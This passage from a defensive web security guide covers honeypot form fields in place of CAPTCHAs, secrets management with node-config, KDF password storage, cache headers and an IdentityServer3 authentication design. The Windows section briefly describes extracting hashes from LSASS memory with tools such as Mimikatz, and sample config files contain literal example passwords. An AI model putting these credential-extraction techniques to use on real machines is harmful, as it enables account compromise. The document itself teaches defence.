I disagree with that statement. A determined hacker will usually be able to find out who your friends are. There is another problem, do you know who all of your friends are? Every acquaintance? I am terrible with names and so are many people. This is supposed to be used to authenticate you. So you have to be able to answer the questions before you can log in.

**Logic Questions**

This is what textcaptcha uses. Simple logic questions designed for the intelligence of a seven year old child. These are more accessible than image and textual image recognition, but they can take longer than image recognition to answer, unless the user is visually impared. The questions are usually language specific also, usually targeting the English language.

**User Interaction**

This is a little like image recognition. Users have to perform actions that virtual intelligence can not work out... yet. Like dragging a slider a certain number of notches.  
If an offering gets popular, creating some code to perform the action may not be that hard and would definitely be worth the effort for bot creators.  
This is obviously not going to work for the visually impaired or for people with handicapped motor skills.

&nbsp;

In NPM land, as usual there are many options to choose from. The following were the offerings I evaluated. None of which really felt like a good fit:

##### Offerings

* total-captcha. Depends on node-canvas. Have to install cairo first, but why? No explanation. Very little of anything here. Move on. How does this work? Do not know. What type is it? Presume text recognition.
* [easy-captcha](https://www.npmjs.com/package/easy-captcha) is a text recognition offering generating images
* [simple-captcha](https://www.npmjs.com/package/simple-captcha) looks like another text recognition offering. I really do not want to be writing image files to my server.
* [node-captcha](https://www.npmjs.com/package/node-captcha) Depends on canvas. By the look of the package this is another text recognition in a generated image.
* [re-captcha](https://www.npmjs.com/package/re-captcha) was one of the first captcha offerings, created at the Carnegie Mellon University by Luis von Ahn, Ben Maurer, Colin McMillen, David Abraham and Manuel Blum who invented the term captcha. Google later acquired it in September 2009. recaptcha is a text recognition captcha that uses scanned text that optical character recognition (OCR) technology has failed to interpret, which has the added benefit of helping to digitise text for The New York Times and Google Books.  
![](images/reCaptcha.jpg)  
* [sweetcaptcha](https://www.npmjs.com/package/sweetcaptcha) uses the sweetcaptcha cloud service of which you must abide by their terms and conditions, requires another node package, and requires some integration work. sweetcaptcha is an image recognition type of captcha.  
![](images/sweetcaptcha.jpg)
* [textcaptcha](http://textcaptcha.com/) is a logic question captcha relying on an external service for the questions and md5 hashes of the correct lower cased answers. This looks pretty simple to set up, but again expects your users to use their brain on things they should not have to.

&nbsp;

After some additional research I worked out why the above types and offerings didn't feel like a good fit. It pretty much came down to user experience. Why should genuine users/customers of your web application be disadvantaged by having to jump through hoops because you have decided you want to stop bots spamming you? Would it not make more sense to make life harder for the bots rather than for your genuine users?

Some other considerations I had. Ideally I wanted a simple solution requiring few or ideally no external dependencies, no JavaScript required, no reliance on the browser or anything out of my control, no images and it definitely should not cost any money.

##### Alternative Approaches

* Services like Disqus can be good for commenting. Obviously the comments are all stored somewhere in the cloud out of your control and this is an external dependency. For simple text input, this is probably not what you want. Similar services such as all the social media authentication services can take things a bit too far I think. They remove freedoms from your users. Why should your users be disadvantaged by leaving a comment or posting a message on your web application? Disqus tracks users activities from hosting website to website whether you have an account, are logged in or not. Any information they collect such as IP address, web browser details, installed add-ons, referring pages and exit links may be disclosed to any third party. When this data is aggregated it is useful for de-anonymising users. If users choose to block the Disqus script, the comments are not visible. Disqus has also published its registered users entire commenting histories, along with a list of connected blogs and services on publicly viewable user profile pages. Disqus also engage in add targeting and blackhat SEO techniques from the websites in which their script is installed.
* Services like Akismet and Mollom which take user input and analyse for spam signatures. Mollom sometimes presents a captcha if it is unsure. These two services learn from their mistakes if they mark something as spam and you unmark it, but of course you are going to have to be watching for that. Matt Mullenweg created Akismet so that his mother could blog in safety. "_His first attempt was a JavaScript plugin which modified the comment form and hid fields, but within hours of launching it, spammers downloaded it, figured out how it worked, and bypassed it. This is a common pitfall for anti-spam plugins: once they get traction_". My advice to this is not to use a common plugin, but to create something custom. I discuss this soon.

The above solutions are excellent targets for creating exploits that will have a large pay off due to the fact that so many websites are using them. There are exploits discovered for these services regularly.

##### Still Not Cutting it

"_Given the fact that many clients count on conversions to make money, not receiving 3.2% of those conversions could put a dent in sales.  Personally, I would rather sort through a few SPAM conversions instead of losing out on possible income._"

> Casey Henry: [Captchas' Effect on Conversion Rates](https://moz.com/blog/captchas-affect-on-conversion-rates)

"_Spam is not the user’s problem; it is the problem of the business that is providing the website. It is arrogant and lazy to try and push the problem onto a website’s visitors._"

> Tim Kadlec: [Death to Captchas](http://timkadlec.com/2011/01/death-to-captchas/)

##### User Time Expenditure

Recording how long it takes from fetch to submit. This is another technique, in which the time is measured from fetch to submit. For example if the time span is under five seconds it is more than likely a bot, so handle the message accordingly.

##### Bot Pot

Spamming bots operating on custom mechanisms will in most cases just try, then move on. If you decide to use one of the common offerings from above, exploits will be more common, depending on how wide spread the offering is. This is one of the cases where going custom is a better option. Worse case is you get some spam and you can modify your technique, but you get to keep things simple, tailored to your web application, your users needs, no external dependencies and no monthly fees. This is also the simplest technique and requires very little work to implement.

Spam bots:

* Love to populate form fields
* Usually ignore CSS. For example, if you have some CSS that hides a form field and especially if the CSS is not inline on the same page, they will usually fail at realising that the field is not supposed to be visible.

So what we do is create a field that is not visible to humans and is supposed to be kept empty. On the server once the form is submitted, we check that it is still empty. If it is not, then we assume a bot has been at it.

This is so simple, does not get in the way of your users, yet very effective at filtering bot spam.

Client side:

{title="CSS", linenos=off, lang=CSS}
    form .bot-pot {
       display: none;
    }

{title="HTML", linenos=off, lang=HTML}
    <form>
       <!--...-->
       <div><input type="text" name="bot-pot" class="bot-pot"></div>
       <!--...-->
    </form>

Server side:

This is also shown above in a larger example in the [Lack of Input Validation, Filtering and Sanitisation](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-nodejs) section. I show the validation code middle ware of the route on line 28 below. The validation is performed on line 14

{title="routes/home.js", linenos=on, lang=JavaScript}
    //...
    
    function home(req, res) {
      res.redirect('/');
    }
    
    function index(req, res) {
       res.render('home', { title: 'Home', id: 'home', brand: 'your brand' });
    }
    
    function validate() {
       return form(
          // Bots love to populate everything.
          fieldToValidate('bot-pot').maxLength(0)
       );
    }
    
    function contact(req, res) {
       
       if(req.form.isValid)
          // We know the bot-pot is of zero length. So no bots.
       //...
    }
    
    module.exports = function (app) {
       app.get('/', index);
       app.get('/home', home); 
       app.post('/contact', validate(), contact);
    };

So as you can see, a very simple solution. You could even consider combining the above two techniques.

##### Testing

&nbsp;

Check out the "Testing for Captcha (OWASP-AT-008" in v3 of the OWASP Testing Guide for summary and description of the issue and testing examples. The Offensive Web Testing Framework (OWTF) also has a [plugin](https://github.com/owtf/owtf/wiki/Listing-Plugins) for it.

### Management of Application Secrets {#web-applications-countermeasures-management-of-application-secrets}

Secure password management within applications is a case of doing what you can, often relying on obscurity and leaning on other layers of defence to make it harder for compromise. Like many of the layers already discussed in the previous chapters.

[Find out](#network-countermeasures-wire-inspecting) how secret the data that is supposed to be secret that is being sent over the network actually is and consider your internal network just as malicious as the internet. Then you will be starting to get the idea of what defence in depth is about. That way when one defence breaks down, you will still be in good standing.

![](images/DefenceInDepth.png)

You may read in many places that having data-store passwords and other types of secrets in configuration files in clear text is an insecurity that must be addressed. Then when it comes to mitigation, there seems to be a few techniques for helping, but most of them are based around obscuring the secret rather than securing it. Essentially just making discovery a little more inconvenient like using an alternative port to SSH to other than the default of 22. Maybe surprisingly though, obscurity does significantly reduce the number of opportunistic type attacks from bots and script kiddies.

#### Store Configuration in Configuration files {#web-applications-countermeasures-management-of-application-secrets-store-configuration}
![](images/ThreatTags/PreventionAVERAGE.png)

Do not hard code passwords in source files for all developers to see. Doing so also means the code has to be patched when services are breached. At the very least, store them in configuration files and use different configuration files for different deployments and consider keeping them out of source control.

Here are some examples using the node-config module.

##### node-config

is a fully featured, well maintained configuration package that I have used on a good number of projects.

To install: From the command line within the root directory of your NodeJS application, run:

`npm install node-config --save`

Now you are ready to start using node-config. An example of the relevant section of an `app.js` file may look like the following:

{title="app.js", linenos=off, lang=JavaScript}
    // Due to bug in node-config the if statement is required before config is required
    // https://github.com/lorenwest/node-config/issues/202
    if (process.env.NODE_ENV === 'production')
       process.env.NODE_CONFIG_DIR = path.join(__dirname, 'config');


Where ever you use node-config, in your routes for example:

{title="home.js", linenos=off, lang=JavaScript}
    var config = require('config');
    var nodemailer = require('nodemailer');
    var enquiriesEmail = config.enquiries.email;
    
    // Setting up email transport.
    var transporter = nodemailer.createTransport({
       service: config.enquiries.service,
       auth: {
          user: config.enquiries.user,
          pass: config.enquiries.pass // App specific password.
       }
    });


A good collection of different formats can be used for the config files: `.json`, `.json5`, `.hjson`, `.yaml`, `.js`, `.coffee`, `.cson`, `.properties`, `.toml`

There is a specific [file loading order](https://github.com/lorenwest/node-config/wiki/Configuration-Files) which you specify by file naming convention, which provides a lot of flexibility and which caters for:

* Having multiple instances of the same application running on the same machine
* The use of short and full host names to mitigate machine naming collisions
* The type of deployment. This can be anything you set the `$NODE_ENV` environment variable to for example: `development`, `production`, `staging`, `whatever`.
* Using and creating config files which stay out of source control. These config files have a prefix of `local`. These files are to be managed by external configuration management tools, build scripts, etc. Thus providing even more flexibility about where your sensitive configuration values come from.

{pagebreak}

The config files for the required attributes used above may take the following directory structure:

{title="directory layout", linenos=off, lang=JavaScript}
    OurApp/
    |
    +-- config/
    |  |
    |  +-- default.js (usually has the most in it)
    |  |
    |  +-- devbox1-development.js
    |  |
    |  +-- devbox2-development.js
    |  |
    |  +-- stagingbox-staging.js
    |  |
    |  +-- prodbox-production.js
    |  |
    |  +-- local.js (creted by build)
    |
    +-- routes
    |  |
    |  +-- home.js
    |  |
    |  +-- ...
    |
    +-- clients
    |  |
    |  +-- ...
    |
    +-- app.js (entry point)
    |
    +-- ...


The contents of the above example configuration files may look like the following:

{title="default.js", linenos=off, lang=JavaScript}
    module.exports = {
       enquiries: {
          // Supported services:
          // https://github.com/andris9/nodemailer-wellknown#supported-services
          // supported-services actually use the best security settings by default.
          // I tested this with a wire capture, because it is always the most fool proof way.
          service: 'FastMail',
          email: 'yourusername@fastmail.com',
          user: 'yourusername',
          pass: null
       }
       // Lots of other settings.
       // ...
    }

{title="devbox1-development.js", linenos=off, lang=JavaScript}
    module.exports = {
       enquiries: {
          // Test password for developer on devbox1
          pass: 'D[6F9,4fM6?%2ULnirPVTk#Q*7Z+5n' // App specific password.
       }
    }

{title="devbox2-development.js", linenos=off, lang=JavaScript}
    module.exports = {
       enquiries: {
          // Test password for developer on devbox2
          pass: 'eUoxK=S9<,`@m0T1=^(EZ#61^5H;.H' // App specific password.
       }
    }

{title="stagingbox-staging.js", linenos=off, lang=JavaScript}
    {}

{title="prodbox-production.js", linenos=off, lang=JavaScript}
    {}

{title="local.js", linenos=off, lang=JavaScript}
    // Build creates this file.
    module.exports = {
       enquiries: {
          // Password created by the build.
          pass: '10lQu$4YC&x~)}lUF>3pm]Tk>@+{N]' // App specific password.
       }
    }

The [Logging](#web-applications-countermeasures-lack-of-visibility-insufficient-logging) section shows more configuration options to provide a slightly bigger picture.

node-config also:

* Provides command line overrides, thus allowing you to override configuration values at application start from command
* Allows for the overriding of environment variables with [custom environment variables](https://github.com/lorenwest/node-config/wiki/Environment-Variables#custom-environment-variables) from a `custom-environment-variables.json` file

&nbsp;

Encrypting/decrypting credentials in code may provide some obscurity, but not much more than that.  
There are different answers for different platforms. None of which provide complete security, if there is such a thing, but instead focusing on different levels of obscurity.

##### Windows 

**Store database credentials as a Local Security Authority (LSA) secret** and create a DSN with the stored credential. Use a SqlServer [connection string](https://www.owasp.org/index.php/Configuration#Secure_connection_strings) with `Trusted_Connection=yes`

The hashed credentials are stored in the SAM file and the registry. If an attacker has physical access to the storage, they can easily copy the hashes if the machine is not running or can be shut-down. The hashes can be sniffed [from the wire](#network-identify-risks-wire-inspecting) in transit. The hashes can be pulled from the running machines memory (specifically the Local Security Authority Subsystem Service (`LSASS.exe`)) using tools such as Mimikatz, WCE, hashdump or fgdump. An attacker generally only needs the hash. Trusted tools like psexec take care of this for us. All discussed in my ["0wn1ng The Web"](https://speakerdeck.com/binarymist/0wn1ng-the-web-at-www-dot-wdcnz-dot-com) presentation. 

&nbsp;

**Encrypt sections** of a web, executable, machine-level, application-level configuration files with `aspnet_regiis.exe` with the `-pe` option and name of the configuration element to encrypt and the configuration provider you want to use. Either `DataProtectionConfigurationProvider` (uses DPAPI) or `RSAProtectedConfigurationProvider` (uses RSA). the `-pd` switch is used to decrypt or programatically:  
`string connStr = ConfigurationManager.ConnectionString["MyDbConn1"].ToString();`

Of course there is a problem with this also. DPAPI uses LSASS, which again an attacker can extract the hash from its memory. If the `RSAProtectedConfigurationProvider` has been used, a key container is required. Mimikatz will force an export from the key container to a `.pvk` file.
Which can then be [read](http://stackoverflow.com/questions/7332722/export-snk-from-non-exportable-key-container) using OpenSSL or tools from the `Mono.Security` assembly.

&nbsp;

I have looked at a few other ways using `PSCredential` and `SecureString`. They all seem to rely on DPAPI which as mentioned uses LSASS which is open for exploitation.

&nbsp;

[**Credential Guard**](https://technet.microsoft.com/en-us/library/mt483740) and Device Guard leverage virtualisation-based security. By the look of it still using LSASS. Bromium have partnered with Microsoft and coined it Micro-virtualization. The idea is that every user task is isolated into its own micro-VM. There seems to be some confusion as to how this is any better. Tasks still need to communicate outside of their VM, so what is to stop malicious code doing the same? I have seen lots of questions but no compelling answers yet. Credential Guard must run on physical hardware directly. Can not run on virtual machines. This alone rules out many deployments.

"_Bromium vSentry transforms information and infrastructure protection with a revolutionary new architecture that isolates and defeats advanced threats targeting the endpoint through web, email and documents_"

"_vSentry protects desktops without requiring patches or updates, defeating and
automatically discarding all known and unknown malware, and eliminating the need for costly remediation._"

This is marketing talk. Please don't take this literally.

"_vSentry empowers users to access whatever information they need from any network, application or website, without risk to the enterprise_"

"_Traditional security solutions rely on detection and often fail to block targeted attacks which use unknown “zero day” exploits. Bromium uses hardware enforced isolation to stop even “undetectable” attacks without disrupting the user._"

> Bromium

"_With Bromium micro-virtualization, we now have an answer: A desktop that is utterly secure and a joy to use_"

> Bromium

These seem like bold claims.

Also worth considering is that Microsofts new virtualization-based security also relies on UEFI Secure Boot, which has been proven [insecure](http://www.itworld.com/article/2707547/endpoint-protection/researchers-demo-exploits-that-bypass-windows-8-secure-boot.html).

##### Linux

**Containers** also help to provide some form of isolation. Allowing you to only have the user accounts to do what is necessary for the application.

I usually use a **deployment tool that also changes the permissions** and ownership of the files involved with the running web application to a single system user, so unprivileged users can not access the web applications files at all. The [deployment script](https://github.com/binarymist/DeploymentTool) is executed over SSH in a remote shell. Only specific commands on the server are allowed to run and a very limited set of users have any sort of access to the machine. If you are using Linux or Docker Containers then you can reduce this even more if it is not already.

One of the beauties of GNU/Linux is that you can have as much or little security as you decide. No one has made that decision for you already and locked you out of the source. You are not feed lies like all of the closed source OS vendors trying to pimp their latest money spinning product. GNU/Linux is a dirty little secrete that requires no marketing hype. It just provides complete control if you want it. If you do not know what you want, then someone else will probably take that control from you. It is just a matter of time if it hasn't happened already.

#### Least Privilege {#web-applications-countermeasures-management-of-application-secrets-least-privilege}
![](images/ThreatTags/PreventionEASY.png)

An application should have the least privileges possible in order to carry out what it needs to do. Consider creating accounts for each trust distinction. For example where you only need to read from a data store, then create that connection with a users credentials that is only allowed to read, and so on for other privileges. This way the attack surface is minimised. Adhering to the principle of least privilege. Also consider removing table access completely from the application and only provide permissions to the application to run stored queries. This way if/when an attacker is able to compromise the machine and retrieve the password for an action on the data-store, they will not be able to do a lot anyway.

#### Location
![](images/ThreatTags/PreventionEASY.png)

Put your services like data-stores on network segments that are as [sheltered](#network-countermeasures-component-placement) as possible and only contain similar services.

Maintain as few user accounts on the servers in question as possible and with the least privileges as possible. 

#### Data-store Compromise {#web-applications-countermeasures-data-store-compromise}
![](images/ThreatTags/PreventionEASY.png)

As part of your defence in depth strategy, you should expect that your data-store is going to get stolen, but hope that it does not. What assets within the data-store are sensitive? How are you going to stop an attacker that has gained access to the data-store from making sense of the sensitive data?

As part of developing the application that uses the data-store, a strategy also needs to be developed and implemented to carry on business as usual when this happens. For example, when your detection mechanisms realise that someone unauthorised has been on the machine(s) that host your data-store, as well as the usual alerts being fired off to the people that are going to investigate and audit, your application should take some automatic measures like:

* All following logins should be instructed to change passwords

If you follow the recommendations below, data-store theft alone will be an inconvenience, but not a disaster.

Consider what sensitive information you really need to store. Consider using the following key derivation functions (KDFs) for all sensitive data. Not just passwords. Also continue to [remind your customers](https://speakerdeck.com/binarymist/passwords-lol) to always use unique passwords that are made up of alphanumeric, upper-case, lower-case and special characters. It is also worth considering pushing the use of high quality password vaults. Do not limit password lengths. Encourage long passwords.

PBKDF2, bcrypt and [scrypt](http://www.tarsnap.com/scrypt.html) are KDFs that are designed to be slow. Used in a process commonly known as key stretching. The process of key stretching in terms of how long it takes can be tuned by increasing or decreasing the number of cycles used. Often 1000 cycles or more for passwords. "_The function used to protect stored credentials should balance attacker and defender verification. The defender needs an acceptable response time for verification of users’ credentials during peak use. However, the time required to map_ `<credential> -> <protected form>` _must remain beyond threats’ hardware (GPU, FPGA) and technique (dictionary-based, brute force, etc) capabilities._"

> OWASP Password Storage

PBKDF2, bcrypt and the newer scrypt, apply a Pseudorandom Function (PRF) such as a cryptographic hash, cipher or HMAC to the data being received along with a unique salt. The salt should be stored with the hashed data.

Do not use MD5, SHA-1 or the SHA-2 family of cryptographic one-way hashing functions by themselves for cryptographic purposes like hashing your sensitive data. In-fact do not use hashing functions at all for this unless they are leveraged with one of the mentioned KDFs. Why? Because they were not designed for passwords (to be slow), the hashing speed can not be slowed as hardware continues to get faster. Many organisations that have had their data-stores stolen and continue to on a weekly basis could avoid their secrets being compromised simply by using a decent KDF with salt and a decent number of iterations.
"_Using four AMD Radeon HD6990 graphics cards, I am able to make about 15.5 billion guesses per second using the SHA-1 algorithm._"

> Per Thorsheim

In saying that, PBKDF2 can use MD5, SHA-1 and the SHA-2 family of hashing functions. Bcrypt uses the Blowfish (more specifically the Eksblowfish) cipher. Scrypt does not have user replaceable parts like PBKDF2. The PRF can not be changed from SHA-256 to something else.

**Which KDF to use?**

This depends on many considerations. I am not going to tell you which is best, because there is no best. Which to use depends on many things. You are going to have to gain understanding into at least all three KDFs. PBKDF2 is the oldest so it is the most battle tested, but there has also been lessons learnt from it that have been taken to the latter two. The next oldest is bcrypt which uses the Eksblowfish cipher which was designed specifically for bcrypt from the blowfish cipher, to be very slow to initiate thus boosting protection against dictionary attacks which were often run on custom Application-specific Integrated Circuits (ASICs) with low gate counts, often found in GPUs of the day (1999).  
The hashing functions that PBKDF2 uses were a lot easier to get speed increases due to ease of parallelisation as opposed to the Eksblowfish cipher attributes such as: far greater memory required for each hash, small and frequent pseudo-random memory accesses, making it harder to cache the data into faster memory. Now with hardware utilising large Field-programmable Gate Arrays (FPGAs), bcrypt brute-forcing is becoming more accessible due to easily obtainable cheap hardware such as:

* [Parallella board](https://www.parallella.org/board/) with Epiphany chip
* [ZedBoard / Zynq 7020](http://picozed.org/product/zedboard)
* [Xeon+FPGA](http://www.extremetech.com/extreme/184828-intel-unveils-new-xeon-chip-with-integrated-fpga-touts-20x-performance-boost)
* [Xeon Phi](http://www.extremetech.com/extreme/133541-intels-64-core-champion-in-depth-on-xeon-phi)
* [Haswell](http://www.theplatform.net/2015/06/02/intel-finishes-haswell-xeon-e5-rollout-launches-broadwell-e3/)

The sensitive data stored within a data-store should be the output of using one of the three key derivation functions we have just discussed. Feed with the data you want protected and a salt. All good frameworks will have at least PBKDF2 and bcrypt APIs

#### Caching of Sensitive Data {#web-applications-countermeasures-management-of-application-secrets-caching-of-sensitive-data}
![](images/ThreatTags/PreventionVERYEASY.png)

Logging out from an application obviously does not clear the browser cache of any sensitive information that might have been stored. Test that any sensitive data responses have `Cache-Control` and `Expires` headers set appropriately.

Use an HTTP intercepting proxy such as ZAP, Burp, etc, to search through the server responses that belong to the session, checking that the server instructed the browser not to cache any data for all responses containing sensitive information.

Use the following headers on such responses:

`Cache-Control: no-cache, no-store`  
`Expires: 0, or past date`  
`Pragma: no-cache`  

You can also add the following flags to the `Cache-Control` header in order to better prevent persistently linked files on the filesystem:

`must-revalidate`, `pre-check=0`, `post-check=0`, `max-age=0`, and `s-maxage=0`

To check that the browsers are respecting the headers, check the cache stores. For example:

For Mozilla Firefox:

* Unix/Linux: `~/.mozilla/firefox/<profile-id>/Cache/`
* Windows: `C:\Documents and Settings\<user_name>\Local Settings\Application Data\`  
  `Mozilla\Firefox\Profiles\<profile-id>\Cache>`

For Internet Explorer:

* `C:\Documents and Settings\<user_name>\Local Settings\Temporary Internet Files>`

Don't forget to plug all your changes into your [Zap Regression Test suite](#process-agile-development-and-practices-security-regression-testing).

#### Physical Access

_Todo_

#### Console Access

_Todo_

#### Network Access

_Todo_

#### Cracking

_Todo_

### Lack of Authentication, Authorisation and Session Management {#web-applications-countermeasures-lack-of-authentication-authorisation-session-management}

I'm going to walk you through some of the important parts of what a possible authentication and authorisation solution might look like that will address the points raised in the [Identify Risks](#web-applications-identify-risks-lack-of-authentication-authorisation-session-management) section from above.

{title="Relevant Standards"}
| Authentication (identity)         | Authorisation
|-----------------------------------|----------
| OpenID                            | OAuth 2
| OpenID Connect (built on OAuth 2) |

The following code is one example of how we can establish authentication and authorisation of individuals desiring to work with a system comprised of any number of front-ends (web, mobile, etc), a service layer API that provides an abstraction to, and communicates with the underlying back-end micro-services. The example uses the Resource Owner Password Credentials (ROPC) flow which is quite a common flow with todays front-end -> service API -> back-end micro-service architectures.

It's also worth checking out the following sections in the OAuth 2.0 specification around the ROPC flow:

* [Resource Owner Password Credentials](http://tools.ietf.org/html/rfc6749#section-1.3.3)
* [Resource Owner Password Credentials Grant](http://tools.ietf.org/html/rfc6749#section-4.3)
* [Security Considerations](http://tools.ietf.org/html/rfc6749#section-10.7)

All the flows are detailed in the [OAuth 2.0](http://tools.ietf.org/html/rfc6749) and [OpenID Connect](http://openid.net/specs/openid-connect-core-1_0.html) specifications.

We'll also discuss integrating external identity providers (The Facebooks, Twitters and Googles) of our world. 

#### Chosen technologies:

|front-end(s)                    |service layer API | back-end micro-services |
|--------------------------------|------------------|-------------------------|
|N/A                             |C#.NET            |C#.NET                   |
|--------------------------------|------------------|-------------------------|
|`Secure` `HTTPOnly` cookie      |IdentityServer3   |IdentityServer3          |
|containing reference token      |                  |                         |
|--------------------------------|------------------|-------------------------|
|localStorage for refresh token  |reference token   |                         |
|                                |MembershipReboot  |MembershipReboot         |

Getting to grips with and understanding enough to create a solution like this can be quite a steep learning experience. The folks from IdentityServer which do this for the love of it have created an outstanding Open Source Software (OSS) project and in all my dealings with them have always gone out of their way to help. In all the projects I've worked on, with all the edge cases, there has always been a way to create the solution that satisfied the requirements.

#### Technology and Design Decisions

##### Reference Token vs JSON Web Token (JWT)

Ideally reference access tokens should be used between front-end(s) and the service layer, which they are in this case. Then JWT, which contains a signed list of the users claims, from the service layer to the back-end micro-services.

JWTs can not be revoked as they are self contained (contain everything about a user that is necessary to make a decision about what the user should be authorised to access)

Reference tokens on the other hand simply contain a reference to the user account which is managed by identity server via MembershipReboot in this case. Thus enabling revocation (logging out of the user for example).

Identity server does not currently support both types of token at once, being able to switch between one or the other (reference for front-end, JWT for back-end), although it is [on the road map](https://github.com/IdentityServer/IdentityServer3/issues/1725). Until this configuration is supported, the service layer can get the users claims by using the reference token. One of those claims being the user GUID. The claims could then be propagated to the micro-services.

##### IdentityServer3

IdentityServer2 was focussed around authentication with some OAuth2 support to assist with authentication.  
AuthorizationServer was more focused on OAuth2 for delegated authorisation.  
IdentityServer3 is a C#.NET library that focusses on both authentication and authorisation. You don't have to have your surrounding out of process components (service layer, micro-services) in .NET for IdentityServer3 to be a viable option. They could be written in another language, so long as they speak HTTP.

##### MembershipReboot

Is a user identity management library with a similar name to the ASP.NET Membership Provider, inspired by it due to [frustrations](http://brockallen.com/2012/09/02/think-twice-about-using-membershipprovider-and-simplemembership/) that Brock Allen (MembershipReboot creator) had from it such as:  

1. A misguided false perception of security, which I agree with
2. A leaky abstraction due to the 27 abstract methods that may or may not be pertinent to your applications needs. Any custom provider you build will need to implement all of these methods whether they are useful to your application or not, otherwise consumers of your custom provider will receive a NotImplementedException. If you choose to only implement the methods that make sense for your application, then the consumers need to know to much about your custom providers internals. Hence encapsulation has broken down and abstraction is leaking.
3. The lockout feature, where as when a certain number of incorrect login attempts occurred, the account would be locked, preventing any further attempts. Also preventing the legitimate account owner from logging in, thus a denial of service (DoS), as there is no ability to unlock the account after a certain period of time. With MembershipReboot we have the `AccountLockoutFailedLoginAttempts` and the much needed `AccountLockoutDuration` on the `MembershipRebootConfiguration` class which does what you expect it to do.
4. Others
 
Some note worthy benefits I've found with MembershipReboot are:

1. From a project I was working on a few years back, MembershipUser was not providing the properties we needed, so having to hide MembershipUser as an Adaptee within an Adapter pattern implementation, a bit like this:
    
    {title="MembershipUser.cs", linenos=off, lang=C#}
        namespace My.MembershipAPI {
           /// <summary>
           /// Utilising the Adapter pattern, gives us control over the Target (MembershipUser)
	       /// interface. The adapter interface (CustomMembershipUser) provides members that
	       /// our client (that's our call sites) can use.
           /// The MembershipUser interface can't be used by our clients as it is, because
	       /// we have a different set of parameters to pass.
           /// Hence we provide an adapter (CustomMembershipUser)
           /// The Adaptee (User) becomes part of the Target (MembershipUser) by way of
	       /// Adapter (CustomMembershipUser)
           /// </summary>
           public class CustomMembershipUser : MembershipUser {
           
              public CustomMembershipUser(
                 MembershipUser membershipUser,
                 string firstName,
                 string lastName,
                 long securityQuestionId,
                 bool isBusinessAStartup,
                 string businessName
              ) : base (
                 membershipUser.ProviderName,
                 membershipUser.UserName,
                 membershipUser.ProviderUserKey,
                 membershipUser.Email,
                 membershipUser.PasswordQuestion,
                 membershipUser.Comment,
                 membershipUser.IsApproved,
                 membershipUser.IsLockedOut,
                 membershipUser.CreationDate,
                 membershipUser.LastLoginDate,
                 membershipUser.LastActivityDate,
                 membershipUser.LastPasswordChangedDate,
                 membershipUser.LastLockoutDate
              ) {
                 UserAccount = new User {
                    FirstName = firstName,
                    LastName = lastName,
                    SecurityQuestionId = securityQuestionId,
                    isBusinessAStartup = isBusinessAStartup,
                    MembershipUserId = (Guid)membershipUser.ProviderUserKey,
                    BusinessName = businessName
                 };
              }
              
              public CustomMembershipUser(MembershipUser membershipUser) : base (
                 membershipUser.ProviderName,
                 membershipUser.UserName,
                 membershipUser.ProviderUserKey,
                 membershipUser.Email,
                 membershipUser.PasswordQuestion,
                 membershipUser.Comment,
                 membershipUser.IsApproved,
                 membershipUser.IsLockedOut,
                 membershipUser.CreationDate,
                 membershipUser.LastLoginDate,
                 membershipUser.LastActivityDate,
                 membershipUser.LastPasswordChangedDate,
                 membershipUser.LastLockoutDate
              ) {}
              
              /// <summary>
              /// Provides get and set access to our User 
              /// </summary>
              public User UserAccount { get; set; }
           }
        }
        
    Where as going down the path of [MembershipReboot](https://github.com/brockallen/BrockAllen.MembershipReboot) and [IdentityServer3.MembershipReboot](https://github.com/IdentityServer/IdentityServer3.MembershipReboot) which is a "_User Service plugin for IdentityServer v3 that uses MembershipReboot as its identity management library. In other words, you're using IdentityServer v3 and you want to use MembershipReboot as your database for user passwords..._" provides the ability to customise, out of the box. All you need to do is add the properties you require to the already provided [`CustomUser`](https://github.com/IdentityServer/IdentityServer3.MembershipReboot/blob/master/source/WebHost/MR/CustomUser.cs) and the data store schema which is also provided in an Entity Framework project that comes with MembershipReboot.
    
    {title="IdentityServer3.MembershipReboot\\source\\WebHost\\MR\\CustomUser.cs", linenos=off, lang=C#}
        namespace WebHost.MR {
           public class CustomUser : RelationalUserAccount {
              public virtual string FirstName { get; set; }
              public virtual string LastName { get; set; }
              public virtual int? Age { get; set; }
           }
           
           public class CustomUserAccountService : UserAccountService<CustomUser> {
              public CustomUserAccountService(CustomConfig config, CustomUserRepository repo)
                 : base(config, repo) {
              }
           }
           
           public class CustomUserRepository
              : DbContextUserAccountRepository<CustomDatabase, CustomUser> {
                 public CustomUserRepository(CustomDatabase ctx) : base(ctx) {}
	       }
        }
        
2. The security focussed [configuration](https://github.com/brockallen/BrockAllen.MembershipReboot/wiki/Security-Settings-Configuration). You can choose to set this within code or config.  
Password storage (as discussed above under the [Data-store Compromise](#web-applications-countermeasures-data-store-compromise) section is [addressed](http://brockallen.com/2014/02/09/how-membershipreboot-stores-passwords-properly/) by using the mature PBKDF2 and providing a config setting in the form of `passwordHashingIterationCount` on the `MembershipRebootConfiguration` class to dial in the number of iterations (stretching), as seen below on line 29. You now have control of how slow you want it to be to crack those passwords. What's more, the iteration count can be set to change each year automatically. If the developer chooses not to touch the iteration count at all (or more likely, forgets), then the default of 0 is inferred. 0 means to automatically calculate the number based on the [OWASP recommendations](https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet) for the current year. In the year 2000 it should be 1000 iterations. The count should be doubled each subsequent two years, so in 2016 we should be using 256000 iterations and that's what MembershipReboot does if the setting is not changed.
    
    {title="backend\\Auth\\AuthService.WebApi\\app.config", linenos=on, lang=XML}
        <!--Lives in Auth Service of Architecture diagram below.-->
        <?xml version="1.0" encoding="utf-8"?>
        <configuration>
          <configSections>
            <section
              name="membershipReboot"
              type="BrockAllen.MembershipReboot.SecuritySettings,
              BrockAllen.MembershipReboot" />
            <section
              name="entityFramework"
              type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection,
              EntityFramework,
              Version=6.0.0.0,
              Culture=neutral,
              PublicKeyToken=b77a5c561934e089"
              requirePermission="false" />
            <connectionStrings>
              <add 
                name="MembershipReboot"
                connectionString=
                "Data Source=(LocalDb)\v11.0;InitialCatalog=AuthServiceDb;Integrated Security=True"
                providerName="System.Data.SqlClient" />      
            </connectionStrings>
            <membershipReboot
              requireAccountVerification="true"
              emailIsUsername="false"
              multiTenant="false"
              allowAccountDeletion="true"
              passwordHashingIterationCount="0"
              accountLockoutDuration="00:01:00"
              passwordResetFrequency="0" />          
            <!--
            Test user bob with password secret was created with 10 iterations of the PBKDF2 KDF
            
            "secret" 10 iterations:
